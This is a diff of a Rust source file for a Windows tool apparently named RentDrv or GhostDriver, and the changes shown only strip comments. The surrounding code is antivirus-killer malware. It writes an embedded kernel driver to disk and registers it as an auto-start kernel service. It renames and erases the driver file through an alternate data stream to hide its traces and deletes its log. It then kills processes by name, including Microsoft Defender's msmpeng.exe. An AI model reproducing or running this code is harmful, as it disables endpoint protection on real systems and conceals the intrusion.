@@ -1,14 +1,9 @@
 #![allow(non_snake_case,non_camel_case_types, dead_code)]
 extern crate winapi;
-
-
-// Standard library imports, sorted alphabetically
 use std::ffi::{CString, OsStr, CStr};
 use std::mem;
 use std::os::windows::ffi::OsStrExt;
 use std::ptr::{null, null_mut};
-
-// winapi imports, grouped by module and sorted alphabetically
 use winapi::ctypes::{c_void, wchar_t};
 use winapi::shared::basetsd::SIZE_T;
 use winapi::shared::minwindef::{DWORD, UINT};
@@ -2765,7 +2760,7 @@ impl RentDrv {
                 to_wstring(DRIVER_NAME).as_ptr(),
                 SERVICE_ALL_ACCESS,
                 SERVICE_KERNEL_DRIVER,
-                SERVICE_AUTO_START, // or SERVICE_AUTO_START based on your requirement
+                SERVICE_AUTO_START, 
                 SERVICE_ERROR_NORMAL,
                 wide_file_path_ptr,
                 null(),
@@ -2885,13 +2880,13 @@ impl RentDrv {
         }
 
         let mut service_status = SERVICE_STATUS {
-            dwServiceType: SERVICE_WIN32_OWN_PROCESS, // type of service
-            dwCurrentState: SERVICE_STOPPED,         // current state of the service
-            dwControlsAccepted: 0,                   // control commands the service accepts
-            dwWin32ExitCode: NO_ERROR,               // error code the service uses to report an error that occurs when it is starting or stopping
-            dwServiceSpecificExitCode: 0,            // service-specific error code
-            dwCheckPoint: 0,                         // value that the service increments periodically to report its progress during a lengthy start, stop, pause, or continue operation
-            dwWaitHint: 0,                           // estimated time required for a pending start, stop, pause, or continue operation, in milliseconds
+            dwServiceType: SERVICE_WIN32_OWN_PROCESS, 
+            dwCurrentState: SERVICE_STOPPED,         
+            dwControlsAccepted: 0,                   
+            dwWin32ExitCode: NO_ERROR,               
+            dwServiceSpecificExitCode: 0,            
+            dwCheckPoint: 0,                         
+            dwWaitHint: 0,                           
         };
 
         let control_result = unsafe {
@@ -2948,9 +2943,9 @@ impl RentDrv {
 
         let mut dw_written: DWORD = 0;
 
-        // Assuming 64-bit, directly set the file size for 64-bit
+        
         let dw_file_size = DRIVER_SIZE_64.try_into().unwrap();
-        // Directly use the 64-bit driver
+        
         let rentdrv2: &[u8] = &RENT_DRIVER_64;
 
 
@@ -2982,26 +2977,26 @@ impl RentDrv {
 
     fn delete_driver_from_disk(&self) -> bool {
         unsafe {
-            // Get the current directory and format the file path for the driver
+            
             let current_dir = get_current_dir();
             let driver_file_path_str = format!("{}{}", current_dir, DRIVER_PATH);
 
-            // Convert the driver file path to a C-style string
+            
             let c_driver_file_path = CString::new(driver_file_path_str).expect("CString::new failed");
 
-            // Delete the driver file
+            
             let delete_driver_result = DeleteFileA(c_driver_file_path.as_ptr()) != 0;
 
-            // Define the log file path
+            
             let log_file_path_str = "C:\\rentdrv.log";
 
-            // Convert the log file path to a C-style string
+            
             let c_log_file_path = CString::new(log_file_path_str).expect("CString::new failed");
 
-            // Delete the log file
+            
             let delete_log_result = DeleteFileA(c_log_file_path.as_ptr()) != 0;
 
-            // Return true if both deletions were successful
+            
             delete_driver_result && delete_log_result
         }
     }
@@ -3075,7 +3070,7 @@ fn get_current_dir() -> String {
     unsafe {
         GetCurrentDirectoryW(MAX_PATH as u32, buf.as_mut_ptr());
     }
-    // Trim the buffer to remove trailing nulls
+    
     let len = buf.iter().position(|&c| c == 0).unwrap_or_else(|| buf.len());
     buf.truncate(len);
     String::from_utf16_lossy(&buf)
@@ -3143,11 +3138,11 @@ fn rename_handle(handle: HANDLE) -> Result<()> {
     let new_name = ":GhostDriver";
     let new_name_wide: Vec<u16> = OsStr::new(new_name)
         .encode_wide()
-        .collect(); // No need for null terminator, Rust Vec ensures null termination
+        .collect(); 
 
     let file_name_length = (new_name_wide.len() * std::mem::size_of::<u16>()) as DWORD;
 
-    // Creating a buffer to hold FILE_RENAME_INFO + new name
+    
     let mut buffer = vec![0u8; std::mem::size_of::<FILE_RENAME_INFO>() + new_name_wide.len() * std::mem::size_of::<u16>()];
     let info = unsafe {
         &mut *(buffer.as_mut_ptr() as *mut FILE_RENAME_INFO)
@@ -3157,7 +3152,7 @@ fn rename_handle(handle: HANDLE) -> Result<()> {
     info.RootDirectory = null_mut();
     info.FileNameLength = file_name_length as DWORD;
 
-    // Copying the new name into the buffer right after FILE_RENAME_INFO
+    
     unsafe {
         std::ptr::copy_nonoverlapping(
             new_name_wide.as_ptr(),
@@ -3226,10 +3221,10 @@ fn erase_driver_file(driver_path_str: &str) -> Result<()> {
 
 
 fn main() {
-    // Predefined list of process names
+    
     let process_names = vec!["msmpeng.exe", "cmd.exe"];
 
-    // Instantiate the RentDrv struct
+    
     let rent_drv = RentDrv::new();
     if let Some(mut drv) = rent_drv {
         println!("[!] Driver is initialized !");
@@ -3242,8 +3237,8 @@ fn main() {
             println!("[!] Driver started !");
         }
 
-        // Specify the path to your driver file
-        let driver_file_name = "ghostdriver.sys"; // Adjust this as per your requirement
+        
+        let driver_file_name = "ghostdriver.sys"; 
         let current_dir = std::env::current_dir().expect("Failed to get current directory");
         let driver_path = current_dir.join(driver_file_name);
         let driver_path_str = driver_path.to_str().expect("Path to string conversion failed");
@@ -3252,7 +3247,7 @@ fn main() {
             eprintln!("[X] Failed to erase driver file: {}", e);
         }
 
-        // Getting PIDs by process names and killing each process
+        
         let pids = get_pids_by_names(process_names);
         for pid in pids {
             drv.kill_process_by_pid(pid);
